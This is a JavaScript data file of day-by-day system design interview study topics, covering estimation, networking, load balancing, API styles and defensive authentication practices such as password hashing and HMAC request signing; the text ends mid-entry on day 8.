/**
 * 45-Day Interview Prep OS - System Design Topics Data
 * Comprehensive topics data covering Parts 0 to 13 from the Senior & Staff
 * System Design Interview Guide, structured by Day (1 to 42).
 *
 * Each study day contains 2 to 4 interactive topics/sections.
 * Days 22 to 41 feature paired theoretical architectural concepts while
 * skipping the database question content for the 20 database specs
 * (which are launched in their dedicated full spec modal).
 */

export const SYSTEM_DESIGN_TOPICS_BY_DAY = {
  "1": [
    {
      "id": "0.1",
      "tabTitle": "0.1 Course Guide",
      "title": "0.1 How to Use This Course",
      "section": "Part 0 · The Playbook",
      "whatItIs": "This course is designed for working software engineers preparing for Senior Software Engineer, Staff Engineer, and System Design interviews. Not meant to be read like a novel — every topic is a mini interview lesson structured around the 6-stage loop: Learn → Visualize → Decide → Apply → Defend → Recall.",
      "architecture": "THE 6-STAGE LEARNING LOOP:\nLearn → Visualize (Draw on whiteboard in <60s) → Decide (When to choose / avoid) → Apply (Production systems) → Defend (Tough interviewer follow-ups) → Recall (Explain from memory unprompted)",
      "tradeoffs": [
        "Memorizing architecture templates vs. Mastering the first-principles decision-making process",
        "Passive reading vs. Active 5-pass drill: Understand → Draw → Explain (60s) → Defend → Rebuild"
      ],
      "keyTakeaway": "Learn the components. Understand the trade-offs. Practice the decisions. Defend the architecture."
    },
    {
      "id": "0.2",
      "tabTitle": "0.2 7-Step Skeleton",
      "title": "0.2 The 7-Step Interview Framework",
      "section": "Part 0 · The Playbook",
      "whatItIs": "Most failed senior loops are not failures of knowledge — they are failures of sequencing. The candidate starts drawing boxes at minute three, never states a number, and never names a trade-off. Use a fixed skeleton so your working memory is spent on the problem, not on the process.",
      "architecture": "45-MINUTE TIMELINE BUDGET:\n• 0–5 min: 1. Requirements (Functional, non-functional, explicitly out of scope; say out loud what you are not building)\n• 5–8 min: 2. Scale Math (QPS, storage/yr, bandwidth, read:write ratio; 1 min of arithmetic determines single-node vs. sharded)\n• 8–12 min: 3. API + Data Model (Access patterns determine DB; write the 3 queries the system must serve fast)\n• 12–20 min: 4. High-Level Design (Boxes, arrows, trace one request end to end before adding anything clever)\n• 20–35 min: 5. Deep Dive (The 1–2 hard parts interviewer steers you to, e.g. idempotency & double charging)\n• 35–42 min: 6. Scale + Failure (Bottleneck → fix → new bottleneck; what breaks when node dies, net split, or 10× traffic)\n• 42–45 min: 7. Wrap-Up & Trade-offs (\"I chose X over Y because of Z; if requirement changed to W I would revisit it\")",
      "tradeoffs": [
        "Requirements: Starts designing immediately (Mid-level) vs. Pins down scale, consistency and latency targets first (Senior/Staff)",
        "Technology choice: 'I'd use Kafka and Cassandra' (Mid-level) vs. 'Write-heavy, append-only, low-cardinality queries → Cassandra; if we need ad-hoc joins, this is the wrong call' (Senior/Staff)",
        "Trade-offs: Lists pros and cons generically (Mid-level) vs. Quantifies: '50% storage overhead vs. 200% for 3× replication' (Senior/Staff)",
        "Failure handling: 'Add a replica' (Mid-level) vs. Explains failover, split-brain, replication lag, and read-after-write repair (Senior/Staff)",
        "Ownership: Design only (Mid-level) vs. Mentions rollout, migration, monitoring, on-call blast radius (Senior/Staff)"
      ],
      "keyTakeaway": "\"I chose X over Y because of Z; if the requirement changed to W I would revisit it.\" — This is the sentence that gets you the senior offer rather than the mid-level one. Narrate your uncertainty instead of hiding it: interviewers probe claims; they rarely probe honest boundaries."
    },
    {
      "id": "0.3",
      "tabTitle": "0.3 Estimation Math",
      "title": "0.3 Back-of-the-Envelope Estimation",
      "section": "Part 0 · The Playbook",
      "whatItIs": "Order-of-magnitude arithmetic done on the whiteboard to size a system before designing it. Estimations are important because we need them to understand the scale of the system, justify the design, and answer whether we need a distributed solution, a cache layer, or data replication vs. sharding.",
      "architecture": "THE FOUR NUMBERS TO DERIVE EVERY TIME (WORKSHEET):\n# 1. Traffic: DAU × actions/user/day = requests/day ÷ 86,400 = avg QPS; peak QPS ≈ avg × 2 to 10\n# 2. Storage: writes/day × bytes/write × 365 × retention_years × replication_factor\n# 3. Bandwidth: peak QPS × average payload bytes (split ingress vs egress)\n# 4. Memory (cache): hot set ≈ 20% of daily reads (80/20 rule) × object size\n\nWORKED EXAMPLE — TWITTER-SCALE TIMELINE:\n• Assumptions: 150M DAU, 2 tweets/day, 100 reads/day, 300B/tweet\n• Writes: 300M/day ÷ 86,400 ≈ 3,500 write QPS (Fits in 1 primary DB)\n• Reads: 15B/day ÷ 86,400 ≈ 175,000 read QPS (50:1 read:write ratio → Cache + Fanout-on-write)\n• Storage: 90 GB/day ≈ 33 TB/yr × 3 replicas ≈ 100 TB/yr\n• Conclusion: Writes fit on one beefy node; reads do not. Shard by user_id, cache in Redis.\n\nROUNDING RULES:\n• 1 day ≈ 86,400 s ≈ 10^5 s (1M/day ≈ 10 QPS; 1B/day ≈ 12K QPS)\n• 2^10=KB, 2^20=MB, 2^30=GB, 2^40=TB, 2^50=PB\n• Round to one significant figure and say so.",
      "tradeoffs": [
        "Jumping to sharding vs. Checking data size: Quadtree index takes only 1.71 GB RAM (fits in 1 node); read replicas spread read load cleanly, whereas sharding introduces complex app routing and scatter-gather",
        "Estimate when: Choosing single-node vs distributed, justifying cache/shard/CDN, sizing queue buffers, arguing storage overhead vs erasure coding",
        "Don't over-invest when: Interviewer says 'assume it's huge, skip math', burning >5 min on arithmetic, or when precision changes no architectural decision",
        "Replication limits: Replicas stop working when (a) write throughput saturates, (b) working set exceeds 1 node RAM, or (c) replication lag violates SLAs → dictates sharding"
      ],
      "keyTakeaway": "Numbers before boxes. Five lines of arithmetic tell you whether you need a distributed system at all. The strongest signal you can send is talking yourself out of complexity — \"1.71 GB fits in RAM, so replicas beat shards here\" — because it proves you optimise for operability, not for resume keywords."
    },
    {
      "id": "0.4",
      "tabTitle": "0.4 Latency Constants",
      "title": "0.4 Numbers Every Engineer Should Memorise",
      "section": "Part 0 · The Playbook",
      "whatItIs": "You cannot reason about a design without knowing the cost of each hop. Memorise the order of magnitude, not the digits.",
      "architecture": "LATENCY AT A GLANCE:\n• L1 cache reference: ~1 ns (Free)\n• Main memory reference: ~100 ns (~100× slower than L1 — data locality matters)\n• Compress 1 KB (Snappy): ~2 µs (Compressing before network transfer almost always wins)\n• Send 1 KB over 1 Gbps network: ~10 µs (Bandwidth is rarely the issue; round trips are)\n• SSD random read (4 KB): ~16–100 µs (~1,000× slower than RAM (sec. 5.4, sec. 6.2))\n• Read 1 MB sequentially from memory: ~100 µs (0.1 ms) (Sequential access is king (sec. 7.2))\n• Round trip within a datacenter: ~0.5 ms (Chatty microservices die here: 20 hops = 10 ms floor)\n• Read 1 MB sequentially from SSD: ~1 ms (~10× slower than RAM)\n• Disk seek (HDD): ~10 ms (Why LSM-trees avoid random writes (sec. 4.9))\n• DNS lookup: 20–120 ms (Cache aggressively; pre-resolve (sec. 2.3))\n• Round trip CA → Netherlands: ~150 ms (Why CDNs and edge PoPs exist (sec. 2.5))\n\nQUICK CONVERSIONS:\n• 1 M/day ≈ 12 QPS\n• 1 B/day ≈ 12 K QPS\n• 1 KB × 10 K QPS ≈ 80 MBPS\n\nAVAILABILITY BUDGETS — KNOW THESE BEFORE YOU PROMISE \"FIVE NINES\":\n• 99% (\"two nines\"): 3.65 days/yr | 7.3 hrs/mo | Internal tooling\n• 99.9%: 8.77 hrs/yr | 43.8 min/mo | Standard SaaS SLA\n• 99.99%: 52.6 min/yr | 4.4 min/mo | Payments, core APIs\n• 99.999%: 5.26 min/yr | 26 sec/mo | Telco, exchanges — needs multi-region + automated failover",
      "tradeoffs": [
        "Synchronous cross-region writes vs. Latency SLA (150 ms WAN RTT blows any 200 ms p99 budget; forces async replication)",
        "Serial dependencies multiplication: a service calling five 99.9% dependencies has a theoretical ceiling of 99.9%⁵ ≈ 99.5%. Either reduce synchronous dependencies, or make them optional with fallbacks (sec. 8.2)"
      ],
      "keyTakeaway": "Quote one concrete number per design decision. \"A cross-region round trip is ~150 ms, so synchronous replication would blow our 200 ms p99 budget — I'll replicate asynchronously and accept read-your-writes repair\" is a complete senior-level argument in a single sentence."
    }
  ],
  "2": [
    {
      "id": "1.1",
      "tabTitle": "1.1 Process vs Thread",
      "title": "1.1 Process vs. Thread",
      "section": "Part 1 · Compute Foundations",
      "whatItIs": "A program is an executable file that contains a set of instructions and is stored passively on disk. A process is a program in execution. A thread is the smallest unit of execution within a process.",
      "architecture": "ADDRESS-SPACE MODEL:\nProcess A: [Code | Data | Heap] ── Threads T1, T2 share Heap & Code (cheap comms, race risk)\nProcess B: [Code | Data | Heap] ── Process A & B share NOTHING (IPC needed, full fault isolation)",
      "tradeoffs": [
        "Processes (Strong isolation, memory safety boundary, Chrome tabs) vs. Threads (Shared heap, ~1 MB stack, thread pool limits)",
        "Kernel Preemptive Threads vs. User-space Cooperative Coroutines (Goroutines, Kotlin coroutines cost KBs and scale to millions)"
      ],
      "keyTakeaway": "Processes buy isolation; threads buy cheap sharing; coroutines buy concurrency density. Name the property you are buying."
    },
    {
      "id": "1.2",
      "tabTitle": "1.2 VMs vs Containers",
      "title": "1.2 Virtualization vs. Containerization",
      "section": "Part 1 · Compute Foundations",
      "whatItIs": "Virtualization is a technology that allows you to create multiple simulated environments or dedicated resources from a single, physical hardware system. Containerization is the packaging together of software code with all its necessary components like libraries, frameworks, and other dependencies so that they are isolated in their own container.",
      "architecture": "ISOLATION MECHANISMS:\n• VMs: Hardware Isolation (Guest OS + Hypervisor) → Minutes start-up, GBs image, 5–15% CPU overhead\n• Containers: Linux kernel namespaces (PID, net, mount) + cgroups (CPU, RAM limits) + overlayfs → Milliseconds start-up, MBs image\n• MicroVMs (AWS Firecracker): Container density with hardware virtualization security boundary (~125 ms boot)",
      "tradeoffs": [
        "Virtual Machines (Hardware boundary, multi-tenant untrusted code) vs. Containers (Shared kernel, high host density, CI/CD speed)",
        "Container escapes (A shared kernel vulnerability compromises the entire host; containers are a configuration boundary, not security)"
      ],
      "keyTakeaway": "Containers abstract the OS; VMs abstract the hardware. Containers buy speed and density; VMs buy hardware-grade isolation. MicroVMs exist because some workloads refuse to compromise on either."
    },
    {
      "id": "1.3",
      "tabTitle": "1.3 Cloud Models",
      "title": "1.3 Cloud Service Models: IaaS, PaaS, SaaS",
      "section": "Part 1 · Compute Foundations",
      "whatItIs": "For on-prem applications, you are responsible for the entire stack: hardware, OS, virtualization, runtime, data, and application. With cloud computing, providers take on varying degrees of responsibility: IaaS provides fundamental infrastructure, PaaS provides managed platforms, and SaaS provides complete delivered software.",
      "architecture": "RESPONSIBILITY SPECTRUM:\n• On-Prem: You manage hardware, virtualization, OS, runtime, and app\n• IaaS (EC2, S3, VPC): Vendor owns hardware & hypervisor; you manage OS, middleware, app\n• PaaS (Heroku, App Engine, RDS): Vendor manages OS & runtime; you own code & data\n• SaaS (Gmail, Datadog): Vendor manages everything; you consume via web/API",
      "tradeoffs": [
        "Control vs. Operational Headcount (IaaS gives kernel tuning but requires dedicated SRE team; PaaS speeds time to market)",
        "Proprietary PaaS lock-in vs. Portability (Keep business logic in portable containers, wrap cloud services behind interfaces)"
      ],
      "keyTakeaway": "Anchor choice on three axes: control, operational headcount, and lock-in vs. time-to-market. A senior engineer never says 'PaaS is too expensive' without factoring in the headcount cost of running IaaS."
    }
  ],
  "3": [
    {
      "id": "1.4",
      "tabTitle": "1.4 Serverless Internals",
      "title": "1.4 AWS Lambda Behind the Scenes",
      "section": "Part 1 · Compute Foundations",
      "whatItIs": "A serverless event-driven execution runtime that runs code in sandboxed Firecracker microVMs with sub-second provisioning and scale-to-zero billing.",
      "architecture": "INVOCATION PATHWAYS:\n• Sync: Client → Frontend Worker → Worker Manager → Placement Service (Provisions MicroVM) → Init (download S3 bundle) → Invoke\n• Async: Client → ALB → Frontend → Internal SQS Queue → Pollers → Worker MicroVM\n• Cold Start: Sandbox placement + download code + runtime bootstrap + init code (avoid heavy VM runtimes, use Provisioned Concurrency)",
      "tradeoffs": [
        "Serverless (Spiky, unpredictable traffic, event glue, zero idle cost) vs. Containers (Steady high-throughput, predictable p99 latency)",
        "Connection exhaustion (1,000 concurrent Lambdas exhaust DB connections; requires RDS Proxy or PgBouncer)"
      ],
      "keyTakeaway": "Serverless does not remove servers; it moves capacity planning to the vendor. Judge it on traffic shape: bursty favors functions, steady favors containers. Always name the connection exhaustion problem when pairing serverless with relational databases."
    },
    {
      "id": "1.5",
      "tabTitle": "1.5 Scaling Ladder",
      "title": "1.5 Scaling a Website to Millions of Users",
      "section": "Part 1 · Compute Foundations",
      "whatItIs": "The canonical 9-stage evolution ladder from a single monolith server to a global distributed microservice platform with database sharding and async message queues.",
      "architecture": "THE 9-STAGE EVOLUTION LADDER:\nStage 1: Single Server (All-in-one)\nStage 2: Separate Web and Database Tiers\nStage 3: Horizontal Scaling with Load Balancer\nStage 4: Database Replication (Read Replicas)\nStage 5: Caching and Content Delivery Network (CDN)\nStage 6: Stateless Architecture (Session in Redis/tokens)\nStage 7: Multiple Data Centers (GeoDNS routing)\nStage 8: Message Queues for Async Processing (Kafka/SQS)\nStage 9: Database Sharding (Horizontal partition)",
      "tradeoffs": [
        "Read Replicas (Cheap read scale, but introduces replication lag breaking read-after-write)",
        "Monolith vs. Microservices (Microservices solve team coordination problems, not performance problems; adds 20 network hops on critical path)"
      ],
      "keyTakeaway": "Scaling is not a ladder you recite — it is: find the bottleneck, remove it, name what breaks next. Replicas scale reads; only sharding scales writes. Never introduce distributed complexity before exhausting simpler primitives."
    },
    {
      "id": "1.6",
      "tabTitle": "1.6 Big Data Cloud",
      "title": "1.6 Choosing a Cloud Vendor for Big Data Solutions",
      "section": "Part 1 · Compute Foundations",
      "whatItIs": "Modern big data architectures follow a vendor-neutral 5-stage pipeline pattern: Ingestion → Storage → Processing → Analytical Warehouse → Visualization. Every major cloud provider offers a suite of managed services that map to these pipeline stages.",
      "architecture": "THE 5-STAGE PIPELINE:\n1. Serverless Ingest: AWS Lambda | GCP Cloud Functions | Azure Functions\n2. Streaming Ingest: Kinesis/MSK | Pub/Sub | Event Hubs\n3. Raw Data Lake: S3 | Cloud Storage | Azure Blob (ADLS)\n4. Batch/Stream Processing: EMR/Glue | Dataproc/Dataflow | Synapse/HDInsight\n5. OLAP Warehouse: Redshift | BigQuery | Synapse",
      "tradeoffs": [
        "Data Warehouse (Known schema, BI reporting, fast joins) vs. Data Lakehouse (Delta/Iceberg on object storage, raw schema-on-read, ML)",
        "Batch (Cheap, hourly tolerance, simple replay) vs. Streaming (Sub-second fraud/alerting, requires watermarking and stateful windowing)"
      ],
      "keyTakeaway": "Big data architectures are vendor-neutral: Ingestion → Lake → Processing → Warehouse → Presentation. Focus on data gravity, query pricing models (serverless vs. provisioned), and schema governance. Never move petabytes across cloud boundaries — compute must travel to the data."
    }
  ],
  "4": [
    {
      "id": "11.1",
      "tabTitle": "11.1 TCP vs UDP",
      "title": "11.1 TCP and UDP Fundamentals",
      "section": "Part 11 · Networking",
      "whatItIs": "TCP provides an ordered, reliable byte stream over an unreliable packet network. UDP provides raw connectionless datagram delivery with minimum latency.",
      "architecture": "TCP MECHANICS & BANDWIDTH-DELAY PRODUCT:\n• 3-Way Handshake: SYN → SYN-ACK → ACK + request (1 RTT before any data)\n• Slow Start: cwnd doubles every RTT (14KB → 28KB → 56KB → 113KB)\n• Bandwidth-Delay Product: Max Throughput = Window Size / RTT. On 100ms RTT link, 64KB window caps transfer at ~5 Mbps regardless of 10 Gbps line!",
      "tradeoffs": [
        "TCP (Order, retransmission, congestion control, HTTP/2) vs. UDP (0-RTT, loss-tolerant, audio/video streaming, DNS, QUIC)",
        "Packet Loss Impact (1% loss at 100ms RTT collapses TCP throughput via cubic backoff; BBR congestion control measures bottleneck bandwidth instead)"
      ],
      "keyTakeaway": "Latency, not bandwidth, is the constraint. Throughput is window / RTT. Terminating connections close to the user shortens the round-trip loop."
    },
    {
      "id": "2.1",
      "tabTitle": "2.1 HTTP Generations",
      "title": "2.1 HTTP 1.0 → 1.1 → 2 → 3 (QUIC)",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "The generational evolution of the web's communication protocol, systematically removing head-of-line (HOL) blocking at different layers.",
      "architecture": "GENERATIONAL COMPARISON:\n• HTTP/1.0 (1996): 1 request per TCP connection (High handshake overhead)\n• HTTP/1.1 (1997): Keep-alive persistent connections, but sequential pipeline (Application HOL blocking)\n• HTTP/2 (2015): Binary framing, multiplexed streams over 1 TCP connection (Transport HOL remains if 1 packet drops)\n• HTTP/3 (2022): QUIC over UDP; independent streams (Transport HOL solved; 0-RTT resumption; connection migration)",
      "tradeoffs": [
        "HTTP/2 Multiplexing Trap (On lossy mobile networks, 1 lost packet stalls all multiplexed streams; HTTP/3 solves this via UDP)",
        "Domain sharding & concatenation (Antipatterns under HTTP/2 & 3; split multiplexed benefits and defeat fine-grained caching)"
      ],
      "keyTakeaway": "Each HTTP generation removed one blocking layer: 1.1 removed per-request handshakes, 2.0 removed app HOL, 3.0 removed transport HOL."
    },
    {
      "id": "2.2",
      "tabTitle": "2.2 Forward vs Reverse Proxy",
      "title": "2.2 Forward Proxy vs. Reverse Proxy",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "A forward proxy acts on behalf of clients to access external resources, hiding client identity. A reverse proxy sits in front of backend web servers to intercept incoming requests, hiding internal infrastructure and providing load balancing, TLS termination, and security buffering.",
      "architecture": "FORWARD PROXY: [Clients] ──► [Forward Proxy] ──► (Internet) ──► [Origin Server]\nREVERSE PROXY: [Clients] ──► (Internet) ──► [Reverse Proxy] ──► [Backend App Pool]\nMnemonic: A forward proxy hides the client from the server; a reverse proxy hides the server from the client.",
      "tradeoffs": [
        "Forward Proxy (Client privacy/Tor, corporate DLP, outbound content filtering, egress caching) vs. Reverse Proxy (Ingress load balancing, TLS offload, WAF/DDoS defense, edge caching)",
        "TLS Termination (Decrypts at edge, enables header inspection & L7 routing) vs. TLS Pass-Through (End-to-end zero trust encryption, but loses header inspection and caching)"
      ],
      "keyTakeaway": "A forward proxy acts for the client; a reverse proxy acts for the server. In system design interviews, reverse proxies are ingress workhorses: place them at the perimeter for TLS offload, load distribution, and security buffering before traffic touches application code."
    }
  ],
  "5": [
    {
      "id": "2.3",
      "tabTitle": "2.3 DNS Lookup",
      "title": "2.3 Domain Name System (DNS)",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "The hierarchical, distributed phonebook of the Internet. Translates human-readable domain names into machine-routable IP addresses across 4 resolution tiers: Recursive Resolver, Root Nameserver, TLD Nameserver, and Authoritative Nameserver.",
      "architecture": "DNS RESOLUTION HIERARCHY:\nClient ──(1)──► Recursive Resolver (8.8.8.8) ──(2)──► Root Nameserver (.) ──► TLD NS (.com) ──(3)──► Authoritative NS (ns1.awsdns.com) ──(4)──► IP 198.51.100.1 (TTL 300s)\nRouting policies: Latency-Based, Geolocation (GeoDNS), Weighted Round-Robin, Failover.",
      "tradeoffs": [
        "High TTL (Sub-millisecond cached responses, minimal nameserver queries) vs. Low TTL (Agile traffic routing and fast failover, high query volume)",
        "The TTL Disrespect Problem (Intermediate resolvers and client runtimes enforce minimum TTL floors, making DNS alone inadequate for sub-minute RTO)"
      ],
      "keyTakeaway": "DNS is a hierarchical, distributed, aggressively cached lookup system and global routing engine. It is not an instant failover mechanism due to TTL disrespect across intermediate caches. For sub-second failover, use BGP Anycast and Layer 4 load balancers below DNS."
    },
    {
      "id": "2.4",
      "tabTitle": "2.4 URL Lifecycle",
      "title": "2.4 What Happens When You Type a URL",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "The complete browser request lifecycle from URL entry to rendering: URL parsing → DNS lookup → TCP handshake → TLS negotiation → HTTP GET → HTML response → DOM rendering.",
      "architecture": "THE END-TO-END FLOW:\n1. URL Parsing (Scheme, host, port, path)\n2. DNS Resolution (Recursive lookup or local cache)\n3. Transport Connection (SYN → SYN-ACK → ACK)\n4. TLS Handshake (Cipher negotiation & session key)\n5. HTTP Request (GET /path HTTP/2 with headers)\n6. Server Ingress (CDN Edge → L4 LB → L7 Gateway → Microservice)\n7. Browser Rendering (DOM + CSSOM = Render Tree → Layout → Paint)",
      "tradeoffs": [
        "Cold Visit Latency (Dominated by round-trips: DNS + TCP + TLS handshakes before first byte arrives)",
        "Server Compute vs. Subresources (HTML transfer is fast; network waterfall of blocking CSS/JS subresources determines user perceived speed)"
      ],
      "keyTakeaway": "Tell the story as: resolve → connect → secure → request → serve-from-nearest-cache → render. Every arrow is a cache and failure boundary."
    },
    {
      "id": "2.9",
      "tabTitle": "2.9 Browser Internals",
      "title": "2.9 How Modern Browsers Work",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "Modern browsers are multi-process operating systems featuring isolated renderer processes per site, GPU compositing, and a strict critical rendering path.",
      "architecture": "CRITICAL RENDERING PATH:\nHTML → Tokenize → DOM Tree ┐\nCSS → CSSOM Tree ─────────┴─► Render Tree → Layout (Geometry) → Paint (Pixels) → Composite (GPU layers)\nSynchronous <script> blocks HTML parsing; CSS blocks rendering. Animating transform/opacity runs on GPU compositor thread without triggering layout.",
      "tradeoffs": [
        "Process-per-site (Strict site isolation prevents Spectre cross-origin memory leaks, at the cost of duplicate RAM overhead) vs. Process-per-tab",
        "Layout vs. Paint vs. Composite (Layout recalculates geometry on main thread; GPU compositing assembles texture layers off-thread)"
      ],
      "keyTakeaway": "A browser is a distributed system on one machine: isolated processes for security, a multi-stage pipeline for rendering."
    }
  ],
  "6": [
    {
      "id": "2.8",
      "tabTitle": "2.8 L4 vs L7 LB",
      "title": "2.8 Load Balancing: L4 vs. L7",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "Traffic dispatch tier distributing client connections across backend server pools to prevent server saturation and guarantee high availability.",
      "architecture": "LAYERED INGRESS TOPOLOGY:\nClients ──► DNS GeoRouting ──► Anycast IP ──► Layer 4 LB (NLB/IPVS, TCP/IP passthrough, stateless, millions QPS)\n                                                  │\n                                                  ▼\n                                              Layer 7 LB / Gateway (ALB/Envoy, TLS termination, path routing, rate limits)\n                                                  │\n                                      ┌───────────┴───────────┐\n                                      ▼                       ▼\n                                  Service A Pool          Service B Pool",
      "tradeoffs": [
        "Layer 4 (Transport, high throughput, protocol-agnostic, no request inspection) vs. Layer 7 (Application, TLS offload, URL path routing, header cookies)",
        "Balancing Algorithms (Round robin vs. Least connections vs. Consistent hashing for cache affinity vs. Power of two choices)",
        "Sticky Sessions (Antipattern: breaks even load distribution and complicates rolling deploys; prefer stateless servers + Redis session store)"
      ],
      "keyTakeaway": "L4 for speed and protocol-agnostic failover; L7 for routing requiring request inspection. Always use health check floors to prevent cascading failovers."
    },
    {
      "id": "2.6",
      "tabTitle": "2.6 API Styles",
      "title": "2.6 API Styles: SOAP, REST, GraphQL, RPC",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "The four primary API paradigms for contract standardization between client interfaces and distributed backend services.",
      "architecture": "PARADIGM MATRIX:\n• REST: Resource-oriented, HTTP verbs (GET/POST/PUT/DELETE), status codes, universally understood, highly cacheable\n• GraphQL: Single POST endpoint, client-specified query over typed schema, eliminates over/under-fetching, harder to cache\n• gRPC: Remote procedure calls, HTTP/2 binary Protobuf framing, code-generated client stubs, high-throughput internal microservices\n• SOAP: XML envelopes, WSDL strict contracts, WS-Security, legacy enterprise banking integrations",
      "tradeoffs": [
        "Public APIs (REST for caching and consumer simplicity) vs. Internal Microservices (gRPC for compact binary serialization and low CPU)",
        "BFF Pattern (Backend-for-Frontend with GraphQL aggregating multiple microservice calls for mobile apps with constrained bandwidth)"
      ],
      "keyTakeaway": "Choose API style by consumer and coupling: REST for public cacheable endpoints, gRPC for fast internal communication, GraphQL for heterogeneous UI clients."
    },
    {
      "id": "11.2",
      "tabTitle": "11.2 API Gateways",
      "title": "11.2 API Gateways, Reverse Proxies and Service Discovery",
      "section": "Part 11 · Networking",
      "whatItIs": "The front door of a service-oriented architecture, applying authentication, rate limiting, and request transformation before dispatching to dynamically discovered instances.",
      "architecture": "CONCERN SEPARATION:\n• Reverse Proxy: Front for backends (TLS termination, compression, HTTP caching)\n• Load Balancer: Distributes connections across instances by health\n• API Gateway: Understands your API (authN validation, per-tenant quotas, canary routing, request aggregation)\n• Service Discovery: Client-side (queries Eureka registry) vs. Server-side (AWS ALB / Kubernetes DNS)",
      "tradeoffs": [
        "Authentication at Gateway vs. Authorization in Service (Validate token once at edge; enforce resource permissions inside service)",
        "Gateway Anti-patterns (Never put business logic in the gateway; avoid creating a monolithic shared deploy queue)"
      ],
      "keyTakeaway": "The gateway answers: 'Who are you and may you make this call at this rate?' The service answers: 'May you do this to THIS object?'"
    }
  ],
  "7": [
    {
      "id": "rev-1",
      "tabTitle": "Drills & Recall",
      "title": "Revision Day 1 · Estimation, Protocols & Ingress",
      "section": "Week 1 Review & Active Recall",
      "whatItIs": "Consolidation and active recall drills on Week 1 fundamentals: back-of-the-envelope calculations, network protocol layers, and ingress topologies.",
      "architecture": "WEEK 1 RAPID AUDIT:\n✓ 7-Step Interview skeleton timing\n✓ Latency hierarchy: RAM (100ns) vs SSD (100µs) vs WAN (150ms)\n✓ TCP slow start and Bandwidth-Delay Product math\n✓ HTTP/1.1 vs HTTP/2 vs HTTP/3 QUIC HOL blocking\n✓ DNS resolution layers and record types (A, CNAME, NS)\n✓ L4 vs L7 load balancer layered architecture",
      "tradeoffs": [
        "Whiteboard Drill: Sizing bandwidth and memory for a 10M DAU service in under 3 minutes",
        "Architecture Drill: Tracing a packet through DNS Anycast, L4 NLB, L7 Envoy, and reverse proxy"
      ],
      "keyTakeaway": "Never enter a design loop without pinning down scale numbers. 5 lines of estimation justify every architectural box you draw."
    },
    {
      "id": "rev-1-checklist",
      "tabTitle": "Week 1 Checklist",
      "title": "Week 1 Core Mastery Checklist",
      "section": "Week 1 Review & Active Recall",
      "whatItIs": "Self-assessment checklist to verify senior-level fluency on Week 1 systems concepts.",
      "architecture": "CHECKLIST OF CORE CONCEPTS:\n[ ] Can you derive QPS and storage requirements on a whiteboard without hesitation?\n[ ] Can you explain why HTTP/2 single connection causes transport HOL on mobile networks?\n[ ] Can you contrast Type-1 hypervisors with Linux cgroups and namespaces?\n[ ] Can you articulate why L4 load balancing is required in front of L7 Envoy gateways?\n[ ] Can you write the Little's Law formula ($L = \\lambda \\times W$) and explain queue collapse?",
      "tradeoffs": [
        "Textbook reciting vs. Senior intuition (Always link concepts to operational failure modes)",
        "Speed vs. Clarity (State assumptions explicitly before calculating numbers)"
      ],
      "keyTakeaway": "Active recall beats passive reading. If you cannot explain a concept in 60 seconds without notes, revisit the section."
    }
  ],
  "8": [
    {
      "id": "3.1",
      "tabTitle": "3.1 Single Sign-On",
      "title": "3.1 Single Sign-On (SSO)",
      "section": "Part 3 · Security, Auth & API Access",
      "whatItIs": "Authentication scheme allowing a user to log in once and access multiple independent applications via a central Identity Provider (IdP).",
      "architecture": "SSO (OIDC) PROTOCOL FLOW:\nUser → App (Gmail) → 302 Redirect to IdP Auth Server → User enters credentials → IdP creates Global Session & issues Token → App validates token with IdP JWKS → Access granted.\nUser navigates to App 2 (YouTube) → Redirect to IdP → Global Session recognized → Token issued with 0 extra credential prompts!",
      "tradeoffs": [
        "SAML 2.0 (XML assertions, enterprise IT legacy) vs. OIDC / OAuth 2.0 (JSON Web Tokens, browser/mobile native, Authorization Code + PKCE)",
        "Local Signature Validation (cache JWKS keys; sub-ms verification, no hot IdP dependency) vs. Token Introspection (network call per request, immediate revocation capability)",
        "Single Logout (SLO): The hardest part in practice — notifying all relying parties via back-channel endpoints"
      ],
      "keyTakeaway": "SSO trades distributed credential risk for centralised session risk. Say: 'OIDC on top of OAuth 2.0 with PKCE, short-lived access tokens, revocable refresh tokens, and back-channel logout.'"
    },
    {
      "id": "3.2",
      "tabTitle": "3.2 Password Hashing",
      "title": "3.2 How to Store Passwords Safely in a Database",
      "section": "Part 3 · Security, Auth & API Access",
      "whatItIs": "Cryptographic defense against credential theft, rainbow tables, and GPU brute-force attacks.",
      "architecture": "STORAGE & VERIFICATION:\nRegister: password + random salt ──► Slow Hash Function (Argon2id / bcrypt) ──► Store $argon2id$v=19$m=65536,t=3,p=4$salt$hash\nValidate: entered password + stored salt ──► Hash ──► Constant-time comparison (prevents timing side-channel leaks)\nPepper: Secret value stored outside database (in KMS/HSM) mixed into hash.",
      "tradeoffs": [
        "SHA-256 (Fatal flaw: GPUs compute billions/sec; salting only defeats rainbow tables, not brute-force) vs. Memory-hard Argon2id / bcrypt",
        "Tuning Work Factor: 100–250ms per verification. Capacity math: at 250ms, 100 logins/sec consumes 25 CPU cores purely on hashing!",
        "Migrating Legacy Hashes: Lazy rehash on login vs. wrap-and-upgrade `argon2id(old_sha256_hash)`"
      ],
      "keyTakeaway": "Unique salt per user + slow memory-hard hash (Argon2id/bcrypt) + constant-time comparison + pepper outside DB. Salting defeats precomputation; only slow hashing defeats brute force."
    },
    {
      "id": "3.3",
      "tabTitle": "3.3 Token vs HMAC",
      "title": "3.3 Securing Web API Access: Token vs. HMAC",
      "section": "Part 3 · Security, Auth & API Access",
      "whatItIs": "Comparing bearer token authentication with cryptographic request signing (HMAC) for public and B2B API access.",
      "architecture": "WHAT TRAVELS ON THE WIRE:\n• Bearer Token: Authorization: Bearer ey... (The secret IS the token; anyone intercepting it can impersonate user)\n• HMAC Signature: Authorization: HMAC appid:signature\n  signature = HMAC(api_key, HTTP_Method + URI + Timestamp + Nonce + SHA256(Body))\n  Secret NEVER leaves either machine; proves possession without transmission!",
      "tradeoffs": [
        "Bearer JWT (User-facing browsers/apps, simple header, relies purely on TLS for transit integrity) vs. HMAC (Server-to-server, payments, webhooks)",
        "Replay Protection: Timestamp (±5 min window) + Redis cached Nonce defeats recorded replay attacks",
        "Zero-Downtime Key Rotation: Dual active keys per client (Key 1 active while Key 2 is migrated)"
      ],
